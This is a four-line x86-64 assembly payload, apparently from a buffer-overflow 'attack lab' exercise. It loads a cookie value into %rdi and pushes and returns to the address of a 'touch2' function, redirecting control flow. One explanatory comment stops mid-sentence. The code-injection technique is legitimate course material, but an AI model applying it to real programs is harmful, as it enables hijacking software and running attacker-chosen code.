mov     $0x65d471b5, %rdi   # move provided Cookie value into first argument register 
pushq   $0x00401dd6         # push address of touch2 function onto the stack. This should ensure that
                            # rsp (stack pointer) is not only aligned correctly, but also points to 
retq
